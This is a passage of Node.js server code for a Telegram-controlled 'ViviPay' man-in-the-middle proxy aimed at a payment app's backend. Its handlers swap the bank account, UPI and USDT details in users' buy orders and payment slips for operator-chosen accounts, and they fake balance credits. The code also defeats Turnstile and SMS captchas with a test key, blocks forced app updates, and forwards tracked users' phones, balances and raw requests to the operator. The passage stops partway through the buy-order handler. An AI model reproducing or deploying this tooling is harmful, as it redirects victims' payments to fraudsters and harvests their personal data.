  res.json({
    status: 'ok', app: 'ViviPay Proxy v4 (server-side)',
    redis: redis ? (redisOk ? 'connected' : 'error') : 'not configured',
    bankActive: !!bank, totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    trackedUsers: Object.keys(data.trackedUsers || {}).length,
    approach: 'Server-side proxy — all /xxapi/* routes intercepted'
  });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.body?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = String(msg.chat.id);
    const rawText = String(msg.text).trim();
    if (!rawText) return res.sendStatus(200);

    // Extract command and arguments (handles /on, /ON, /on@BotName, /addbank, etc.)
    const cmdMatch = rawText.match(/^(\/[a-zA-Z0-9_]+)(?:@[a-zA-Z0-9_]+)?(.*)$/s);
    let cmd = '';
    let cmdArgs = '';
    if (cmdMatch) {
      cmd = cmdMatch[1].toLowerCase();
      cmdArgs = (cmdMatch[2] || '').trim();
    } else {
      cmd = rawText.split(/\s+/)[0].toLowerCase();
      cmdArgs = rawText.substring(cmd.length).trim();
    }

    let data = await loadData(true);

    if (cmd === '/start') {
      if (data.adminChatId && String(data.adminChatId) !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data = await saveSettings({ adminChatId: chatId });
      await bot.sendMessage(chatId,
        `🏦 ViviPay Proxy Controller v4
(Server-Side Proxy Mode)

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI
/removebank <number>
/setbank <number>
/setmin <number> <amount> — Min buy amount for bank replace
/banks — List all banks

=== MANUAL ORDERS ===
/addorder <OrderNo> | <BankIndex> — Map order to a bank
/delorder <OrderNo> — Remove a mapped order
/orders — List all saved manual orders

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate
/log — Toggle request logging
/rr — Toggle full raw request+response log
/update — Toggle update block
/status — Full status

=== BALANCE ===
/add <amount> <userId>
/deduct <amount> <userId>
/remove balance <userId>
/history — Balance history
/clearhistory — Clear history

=== USDT ===
/usdt <address> — Set USDT
/usdt off — Disable

=== TRACKING ===
/idtrack — All tracked users

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && String(data.adminChatId) !== chatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (cmd === '/status') {
      data = await loadData(true);
      const active = getActiveBank(data, null);
      let m = `📊 ViviPay Status (v4 Server-Side):\nProxy: ${data.botEnabled !== false ? '🟢 ON' : '🔴 OFF'}\nBanks: ${(data.banks || []).length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nRaw Log: ${data.rawLog ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
      if (active) m += `\n\n💳 Active Bank (#${(data.activeIndex >= 0 ? data.activeIndex + 1 : 1)}):\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}${active.minAmount ? '\nMin Amount: ₹' + active.minAmount : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (cmd === '/on') {
      data = await saveSettings({ botEnabled: true });
      await bot.sendMessage(chatId, '🟢 Proxy ON (Enabled)');
      return res.sendStatus(200);
    }

    if (cmd === '/off') {
      data = await saveSettings({ botEnabled: false });
      await bot.sendMessage(chatId, '🔴 Proxy OFF (Disabled)');
      return res.sendStatus(200);
    }

    if (cmd === '/rotate') {
      const nextRotate = !data.autoRotate;
      data = await saveSettings({ autoRotate: nextRotate, lastUsedIndex: -1 });
      await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${nextRotate ? 'ON' : 'OFF'}`);
      return res.sendStatus(200);
    }

    if (cmd === '/log') {
      const nextLog = !data.logRequests;
      data = await saveSettings({ logRequests: nextLog });
      await bot.sendMessage(chatId, `📋 Logging: ${nextLog ? 'ON' : 'OFF'}`);
      return res.sendStatus(200);
    }

    if (cmd === '/rr') {
      const nextRaw = !data.rawLog;
      data = await saveSettings({ rawLog: nextRaw });
      await bot.sendMessage(chatId,
        nextRaw
          ? '📡 Raw Log: 🟢 ON\n\nAb har request ka FULL detail aayega:\n• Method, URL, Headers, Body\n• Response Status, Headers, Body\n• App API (/xxapi/*) + Frontend pages dono\n\nBand karne ke liye dobara /rr bhejo.'
          : '📡 Raw Log: 🔴 OFF\n\nFull request/response logging band.'
      );
      return res.sendStatus(200);
    }

    if (cmd === '/update') {
      let block = true;
      const lowerArg = cmdArgs.toLowerCase();
      if (lowerArg === 'on' || lowerArg === 'allow') {
        block = false;
      } else if (lowerArg === 'off' || lowerArg === 'block') {
        block = true;
      } else {
        block = !data.blockUpdate;
      }
      data = await saveSettings({ blockUpdate: block });
      await bot.sendMessage(chatId, block ? '🚫 Update BLOCKED' : '✅ Update ALLOWED');
      return res.sendStatus(200);
    }

    if (cmd === '/add') {
      const parts = cmdArgs.split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>\nExample: /add 500 123456');
        return res.sendStatus(200);
      }
      data = await loadData(true);
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
      if (!data.balanceHistory) data.balanceHistory = [];
      const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
      data.balanceHistory.push({
        type: 'add',
        userId: targetUserId,
        amount,
        totalAdded: data.userOverrides[targetUserId].addedBalance,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked && tracked.phone) || ''
      });
      data = await saveSettings({ userOverrides: data.userOverrides, balanceHistory: data.balanceHistory });
      const statusMsg = tracked ? `📊 Balance: ₹${tracked.balance || 'N/A'}` : `⏳ User is offline — ₹${data.userOverrides[targetUserId].addedBalance} will show when they open the app`;
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
      return res.sendStatus(200);
    }

    if (cmd === '/deduct') {
      const parts = cmdArgs.split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>\nExample: /deduct 500 123456');
        return res.sendStatus(200);
      }
      data = await loadData(true);
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
      if (!data.balanceHistory) data.balanceHistory = [];
      data.balanceHistory.push({
        type: 'deduct',
        userId: targetUserId,
        amount,
        totalAdded: data.userOverrides[targetUserId].addedBalance,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      });
      data = await saveSettings({ userOverrides: data.userOverrides, balanceHistory: data.balanceHistory });
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total: ₹${data.userOverrides[targetUserId].addedBalance || 0}`);
      return res.sendStatus(200);
    }

    if (cmd === '/remove' && cmdArgs.toLowerCase().startsWith('balance')) {
      const targetId = cmdArgs.substring(7).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
      data = await loadData(true);
      if (data.userOverrides && data.userOverrides[targetId]) {
        const removed = data.userOverrides[targetId].addedBalance || 0;
        delete data.userOverrides[targetId].addedBalance;
        data = await saveSettings({ userOverrides: data.userOverrides });
        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} balance override from user ${targetId}`);
      } else {
        await bot.sendMessage(chatId, `ℹ️ No balance override found for ${targetId}`);
      }
      return res.sendStatus(200);
    }

    if (cmd === '/history') {
      data = await loadData(true);
      const ht = cmdArgs.trim();
      const history = data.balanceHistory || [];
      const filtered = ht ? history.filter(h => h.userId === ht) : history;
      if (filtered.length === 0) { await bot.sendMessage(chatId, '📋 No balance history found.'); return res.sendStatus(200); }
      let m = '📊 Balance History:\n\n';
      for (const h of filtered.slice(-20)) {
        m += `${h.type === 'add' ? '➕' : '➖'} ₹${h.amount} → ${h.userId}${h.phone ? ' (' + h.phone + ')' : ''} | ${h.time}\n`;
      }
      await bot.sendMessage(chatId, m.substring(0, 4000));
      return res.sendStatus(200);
    }

    if (cmd === '/clearhistory') {
      data = await saveSettings({ balanceHistory: [] });
      await bot.sendMessage(chatId, '🗑 Balance history cleared.');
      return res.sendStatus(200);
    }

    if (cmd === '/idtrack') {
      data = await loadData(true);
      const tracked = data.trackedUsers || {};
      const ids = Object.keys(tracked);
      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet.'); return res.sendStatus(200); }
      let m = '📋 Tracked Users:\n\n';
      for (const uid of ids) {
        const u = tracked[uid];
        const addedBal = data.userOverrides && data.userOverrides[uid] && data.userOverrides[uid].addedBalance ? ` (+₹${data.userOverrides[uid].addedBalance})` : '';
        m += `👤 ID: ${uid}\n`;
        if (u.name) m += `   📛 ${u.name}\n`;
        if (u.phone) m += `   📱 ${u.phone}\n`;
        if (u.balance) m += `   💰 ₹${u.balance}${addedBal}\n`;
        m += `   🕐 ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n\n`;
      }
      await bot.sendMessage(chatId, m.substring(0, 4000));
      return res.sendStatus(200);
    }

    if (cmd === '/banks') {
      data = await loadData(true);
      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added.'); return res.sendStatus(200); }
      await bot.sendMessage(chatId, '💳 Banks:\n\n' + bankListText(data));
      return res.sendStatus(200);
    }

    if (cmd === '/orders') {
      data = await loadData(true);
      if (!data.orderBankMap || Object.keys(data.orderBankMap).length === 0) {
        await bot.sendMessage(chatId, '📋 No saved orders.');
        return res.sendStatus(200);
      }
      const manualOrders = [];
      const seen = new Set();
      for (const [orderId, orderData] of Object.entries(data.orderBankMap)) {
        if (!orderData.isManual) continue;
        const uniqueKey = orderData.rptNo || orderId;
        if (seen.has(uniqueKey)) continue;
        seen.add(uniqueKey);
        manualOrders.push(`🛒 Order: ${uniqueKey}\n🏦 Bank: ${orderData.bank}\n`);
      }
      let m = `📋 Saved Orders (${manualOrders.length}):\n\n`;
      for (const ord of manualOrders) {
        m += ord + '\n';
      }
      await bot.sendMessage(chatId, m.substring(0, 4000) || '📋 No manually saved orders.');
      return res.sendStatus(200);
    }

    if (cmd === '/addorder') {
      const parts = cmdArgs.split('|').map(s => s.trim());
      if (parts.length < 2) {
        await bot.sendMessage(chatId, '❌ Format: /addorder <OrderNo> | <BankNumber>\nExample: /addorder 5524954159126535 | 1');
        return res.sendStatus(200);
      }
      data = await loadData(true);
      const orderNo = parts[0];
      const bankIdx = parseInt(parts[1]) - 1;

      if (isNaN(bankIdx) || bankIdx < 0 || !data.banks || bankIdx >= data.banks.length) {
        await bot.sendMessage(chatId, `❌ Invalid Bank Number. You have ${data.banks ? data.banks.length : 0} banks added. Use /banks to see the list.`);
        return res.sendStatus(200);
      }

      const selectedBank = data.banks[bankIdx];
      const accountHolder = selectedBank.accountHolder || '';
      const accountNo = selectedBank.accountNo || '';
      const ifsc = selectedBank.ifsc || '';
      const bankName = selectedBank.bankName || '';
      const upiId = selectedBank.upiId || '';

      if (!data.orderBankMap) data.orderBankMap = {};

      const last4 = accountNo.slice(-4);
      let wDomain = '';
      if (accountNo) {
        wDomain = `mobikwik://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(accountHolder)}&amount=0.0&displayAccountNumber=xxxxxxxxx${last4}`;
      }

      data.orderBankMap[orderNo] = {
        bank: `${accountHolder} | ${accountNo}${ifsc ? ' | ' + ifsc : ''}`,
        accountHolder,
        accountNo,
        ifsc,
        bankName,
        upiId,
        rptNo: orderNo,
        orderNo: orderNo,
        walletDomain: wDomain,
        payType: 1,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        userId: 'manual',
        forced: true,
        isManual: true
      };

      data = await saveSettings({ orderBankMap: data.orderBankMap });
      await bot.sendMessage(chatId, `✅ Saved Order Mapping:\nOrder: ${orderNo}\nMapped to Bank #${bankIdx + 1}:\n${selectedBank.accountHolder} | ${selectedBank.accountNo}`);
      return res.sendStatus(200);
    }

    if (cmd === '/delorder') {
      const orderNo = cmdArgs.trim();
      data = await loadData(true);
      if (!data.orderBankMap) {
        await bot.sendMessage(chatId, `❌ Order ${orderNo} not found in saved mappings.`);
        return res.sendStatus(200);
      }

      let deleted = false;
      if (data.orderBankMap[orderNo]) {
        delete data.orderBankMap[orderNo];
        deleted = true;
      }

      for (const [k, v] of Object.entries(data.orderBankMap)) {
        if (v.orderNo === orderNo || v.rptNo === orderNo || v.orderId === orderNo || v.id === orderNo) {
          delete data.orderBankMap[k];
          deleted = true;
        }
      }

      if (!deleted) {
        await bot.sendMessage(chatId, `❌ Order ${orderNo} not found in saved mappings.`);
        return res.sendStatus(200);
      }

      data = await saveSettings({ orderBankMap: data.orderBankMap });
      await bot.sendMessage(chatId, `🗑️ Removed order mapping for: ${orderNo}`);
      return res.sendStatus(200);
    }

    if (cmd === '/addbank') {
      const parts = cmdArgs.split('|').map(s => s.trim());
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI'); return res.sendStatus(200); }
      data = await loadData(true);
      if (!data.banks) data.banks = [];
      if (data.banks.length >= 20) { await bot.sendMessage(chatId, '❌ Max banks reached.'); return res.sendStatus(200); }
      const nb = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
      data.banks.push(nb);
      if (data.activeIndex < 0) data.activeIndex = 0;
      data = await saveSettings({ banks: data.banks, activeIndex: data.activeIndex });
      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${nb.accountHolder} | ${nb.accountNo}\nIFSC: ${nb.ifsc}`);
      return res.sendStatus(200);
    }

    if (cmd === '/removebank') {
      const idx = parseInt(cmdArgs) - 1;
      data = await loadData(true);
      if (isNaN(idx) || idx < 0 || !data.banks || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      data = await saveSettings({ banks: data.banks, activeIndex: data.activeIndex });
      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (cmd === '/setbank') {
      const idx = parseInt(cmdArgs) - 1;
      data = await loadData(true);
      if (isNaN(idx) || idx < 0 || !data.banks || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
      data = await saveSettings({ activeIndex: idx });
      await bot.sendMessage(chatId, `✅ Active bank set to #${idx + 1}:\n${data.banks[idx].accountHolder} | ${data.banks[idx].accountNo} | ${data.banks[idx].ifsc}`);
      return res.sendStatus(200);
    }

    if (cmd === '/setmin') {
      data = await loadData(true);
      const parts = cmdArgs.split(/\s+/);
      const bankIdx = parseInt(parts[0]) - 1;
      const amount = parseFloat(parts[1]);
      if (isNaN(bankIdx) || bankIdx < 0 || !data.banks || bankIdx >= data.banks.length || isNaN(amount) || amount < 0) {
        await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500\n\nBank replace sirf tabhi hoga jab buy amount >= set amount');
        return res.sendStatus(200);
      }
      data.banks[bankIdx].minAmount = amount;
      data = await saveSettings({ banks: data.banks });
      await bot.sendMessage(chatId, amount === 0
        ? `✅ Bank #${bankIdx + 1} ka min amount remove kiya — ab saari amounts pe bank replace hoga`
        : `✅ Bank #${bankIdx + 1} min amount: ₹${amount}\nAb sirf ₹${amount}+ ke buy orders pe bank replace hoga`);
      return res.sendStatus(200);
    }

    if (cmd === '/usdt') {
      const addr = cmdArgs.trim();
      data = await loadData(true);
      if (addr.toLowerCase() === 'off') {
        data = await saveSettings({ usdtAddress: '' });
        await bot.sendMessage(chatId, '❌ USDT override OFF');
      } else if (addr.length >= 20) {
        data = await saveSettings({ usdtAddress: addr });
        await bot.sendMessage(chatId, `₮ USDT set to: ${addr}`);
      } else {
        await bot.sendMessage(chatId, '❌ Invalid address. Format: /usdt <address> or /usdt off');
      }
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch (e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

async function proxyToTivox(req) {
  const path = req.originalUrl || req.url;
  const url = TIVOX_API + path;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'tivox.icu';
  fwd['origin'] = 'https://vivipay.net';
  fwd['referer'] = 'https://vivipay.net/';
  if (!fwd['user-agent']) {
    fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
  }
  const opts = { method: req.method, headers: fwd, redirect: 'manual' };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  return { response, respBody, respHeaders };
}

async function proxyToReal(req) {
  const path = req.originalUrl || req.url;
  const url = TIVOX_API + path;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl === 'x-px-uid' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') || kl.startsWith('x-px-')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'tivox.icu';
  fwd['origin'] = 'https://vivipay.net';
  fwd['referer'] = 'https://vivipay.net/';
  if (!fwd['user-agent']) {
    fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
  }
  const opts = { method: req.method, headers: fwd, redirect: 'manual' };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  return { response, respBody, respHeaders };
}

function sendJson(res, headers, json, fallbackBody) {
  const body = json ? JSON.stringify(json) : fallbackBody;
  headers['content-type'] = 'application/json; charset=utf-8';
  headers['content-length'] = String(Buffer.byteLength(body));
  res.writeHead(200, headers);
  res.end(body);
}

// rsCfg.json — rsKeyMode:-1 makes app skip Turnstile entirely (sets token="1" automatically).
// getsendtken with token="1" is force-patched to succeed by our /xxapi/* handler below.
app.get('/rsCfg.json', async (req, res) => {
  try {
    const url = 'https://' + FRONTEND_HOST + req.originalUrl;
    const resp = await fetch(url, { headers: { host: FRONTEND_HOST } });
    let cfg = null;
    try { cfg = await resp.json(); } catch (e) { }
    if (cfg && cfg.data) {
      cfg.data.okTurnstileSitekey = '1x00000000000000000000AA';   // CF test key — always passes
      cfg.data.siteKey = '1x00000000000000000000AA';
      cfg.data.rsKeyMode = 1;              // render Turnstile widget with test sitekey
      cfg.data.sliderSmsCaptcha = 0;       // disable SMS slider captcha
      cfg.data.tgChannelLink = TELEGRAM_OVERRIDE;
      cfg.data.whatsappLink = TELEGRAM_OVERRIDE;
    }
    res.setHeader('content-type', 'application/json; charset=utf-8');
    res.setHeader('access-control-allow-origin', '*');
    res.setHeader('cache-control', 'no-store');
    res.json(cfg || {
      code: 0, msg: 'success', data: {
        okTurnstileSitekey: '1x00000000000000000000AA',
        siteKey: '1x00000000000000000000AA',
        rsKeyMode: 1,
        sliderSmsCaptcha: 0
      }
    });
  } catch (e) {
    res.json({
      code: 0, msg: 'success', data: {
        okTurnstileSitekey: '1x00000000000000000000AA',
        siteKey: '1x00000000000000000000AA',
        rsKeyMode: 1,
        sliderSmsCaptcha: 0
      }
    });
  }
});

app.get('/app/version', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders } = await proxyToTivox(req);
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch (e) { }
    if (jsonResp) {
      if (data.blockUpdate !== false) {
        if (jsonResp.forceUpdate !== undefined) jsonResp.forceUpdate = false;
        if (jsonResp.needUpdate !== undefined) jsonResp.needUpdate = false;
        if (jsonResp.force_update !== undefined) jsonResp.force_update = false;
        if (jsonResp.update !== undefined) jsonResp.update = false;
        const rd = jsonResp.data || jsonResp.body || jsonResp.result;
        if (rd && typeof rd === 'object') {
          if (rd.forceUpdate !== undefined) rd.forceUpdate = false;
          if (rd.needUpdate !== undefined) rd.needUpdate = false;
        }
      }
      sendJson(res, respHeaders, jsonResp);
    } else {
      respHeaders['content-length'] = String(Buffer.byteLength(respBody));
      res.writeHead(response.status, respHeaders);
      res.end(respBody);
    }
  } catch (e) {
    console.error('version error:', e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.get('/app/jsValue/:type', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders } = await proxyToTivox(req);
    notifyAdmin(data, `📜 JS Value (${req.params.type})\n${respBody.substring(0, 500)}`);
    respHeaders['content-length'] = String(Buffer.byteLength(respBody));
    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

// ── Explicit High-Priority Interceptor for Buy History (/xxapi/buyitoken/history) ──
app.all(['/xxapi/buyitoken/history', '/xxapi/buyitoken/history*'], async (req, res) => {
  try {
    if (req.method === 'OPTIONS') {
      res.setHeader('Access-Control-Allow-Origin', '*');
      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
      res.setHeader('Access-Control-Allow-Headers', '*');
      res.setHeader('Access-Control-Allow-Credentials', 'true');
      return res.status(200).end('OK');
    }
    const data = await loadData();
    const { response, respBody, respHeaders } = await proxyToTivox(req);
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch (e) { }

    if (jsonResp && jsonResp.data) {
      const activeBank = getActiveBank(data, null);
      if (activeBank && data.botEnabled !== false) {
        const orderList = Array.isArray(jsonResp.data) ? jsonResp.data : (Array.isArray(jsonResp.data.list) ? jsonResp.data.list : (Array.isArray(jsonResp.data.data) ? jsonResp.data.data : []));
        for (const order of orderList) {
          if (!order || typeof order !== 'object') continue;
          const orderId = String(order.rptNo || order.orderNo || order.id || '');
          const altId = String(order.orderNo || order.rptNo || '');
          const targetBank = resolveTargetBank(data, orderId, altId, activeBank);
          replaceOrderBankDetails(order, targetBank);
        }
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    console.error('History explicit route error:', e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

// ── Explicit High-Priority Interceptor for Payment Slip Detail (/xxapi/buyitoken/paymentslipdetail) ──
app.all(['/xxapi/buyitoken/paymentslipdetail', '/xxapi/buyitoken/paymentslipdetail*'], async (req, res) => {
  try {
    if (req.method === 'OPTIONS') {
      res.setHeader('Access-Control-Allow-Origin', '*');
      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
      res.setHeader('Access-Control-Allow-Headers', '*');
      res.setHeader('Access-Control-Allow-Credentials', 'true');
      return res.status(200).end('OK');
    }
    const data = await loadData();
    const { response, respBody, respHeaders } = await proxyToTivox(req);
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch (e) { }

    if (jsonResp && jsonResp.data && typeof jsonResp.data === 'object') {
      const activeBank = getActiveBank(data, null);
      if (activeBank && data.botEnabled !== false) {
        const orderId = String(jsonResp.data.rptNo || jsonResp.data.id || jsonResp.data.orderNo || req.query.id || '');
        const targetBank = resolveTargetBank(data, orderId, '', activeBank);
        replaceOrderBankDetails(jsonResp.data, targetBank);
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    console.error('paymentslipdetail explicit route error:', e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.all('/xxapi/*', async (req, res) => {
  try {
    const data = await loadData();
    const path = req.originalUrl || req.url;
    const urlLower = path.toLowerCase();
    const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

    // Handle OPTIONS requests (CORS preflight) early
    if (req.method === 'OPTIONS') {
      res.setHeader('Access-Control-Allow-Origin', '*');
      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
      res.setHeader('Access-Control-Allow-Headers', '*');
      res.setHeader('Access-Control-Allow-Credentials', 'true');
      return res.status(200).end('OK');
    }

    // ── 100% CLEAN BYPASS FOR UPI & TEAM BUTTONS ──────────────────────────────
    if (urlLower.includes('/collectiontoollist') || urlLower.includes('/teaminfo')) {
      const { response: r, respBody: rb, respHeaders: rh } = await proxyToReal(req);
      rh['content-length'] = String(Buffer.byteLength(rb));
      rh['Access-Control-Allow-Origin'] = '*';
      res.writeHead(r.status, rh);
      return res.end(rb);
    }
    // ──────────────────────────────────────────────────────────────────────────


    // Security checks are no longer intercepted.
    // They are handled natively by the real backend.

    // ── Buy / pick-up order intercept — per-wallet, two-case force logic ────────
    // List endpoints (just fetching available orders) must NOT be intercepted
    const isBuyList = urlLower.includes('/list') || urlLower.includes('_list') ||
      urlLower.includes('listbuy') || urlLower.includes('list_buy') ||
      // Detail / info / query / status endpoints must NOT be treated as buy actions
      urlLower.includes('/detail') || urlLower.includes('_detail') ||
      urlLower.includes('/info') || urlLower.includes('_info') ||
      urlLower.includes('/query') || urlLower.includes('_query') ||
      urlLower.includes('/status') || urlLower.includes('_status') ||
      urlLower.includes('/view') || urlLower.includes('_view') ||
      urlLower.includes('/check') || urlLower.includes('_check') ||
      urlLower.includes('/record') || urlLower.includes('_record') ||
      urlLower.includes('/history') || urlLower.includes('_history') ||
      urlLower.includes('cancel');

    // Detect wallet type from URL for specific handling
    const isUsdtBuy = urlLower.includes('usdt');
    const isMobiKwikBuy = urlLower.includes('mobikwik') || urlLower.includes('mkw');
    const isOsdtBuy = urlLower.includes('osdt') || urlLower.includes('upiplus') || urlLower.includes('upi_plus');

    let proxyRes = null;
    const isBuyOrder = !isBuyList && req.method === 'POST' && (
      /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy)\b/i.test(path) ||
      /\/(buy|pick|grab|take|receive|rob|snatch)(itoken|order|osdt|usdt|mobikwik|rpt|paymentslip)\b/i.test(path) ||
      path.toLowerCase().endsWith('/buy') || path.toLowerCase().includes('/buy?') ||
      urlLower.includes('buyitoken') || urlLower.includes('buy_itoken') ||
      urlLower.includes('buyorder') || urlLower.includes('buy_order')
    );

    if (isBuyOrder) {
      proxyRes = await proxyToTivox(req);
      const { response: br, respBody: bb, respHeaders: bh } = proxyRes;
      let bj = null;
      try { bj = JSON.parse(bb); } catch (e) { }
      if (bj) {
        const origCode = bj.code;
        const origMsg = String(bj.msg || bj.message || '');

        let reqOrderId = '';
        try {
          const ct = (req.headers['content-type'] || '').toLowerCase();
          let rb = {};
          if (ct.includes('multipart') && req.rawBody) {
            rb = parseMultipartFields(req.rawBody);
          } else if (ct.includes('json') && req.rawBody) {
            rb = JSON.parse(req.rawBody.toString());
          } else if (ct.includes('form') && req.rawBody) {
            rb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
          }
          const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
          reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || rb.id || rb.slipId || qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || qs.get('id') || qs.get('slipId') || '';
        } catch (e) { }

        // Also check if response has orderId if request doesn't
        if (!reqOrderId && bj.data && typeof bj.data === 'object') {
          reqOrderId = bj.data.orderId || bj.data.orderNo || bj.data.rptNo || bj.data.slipId || '';
        }

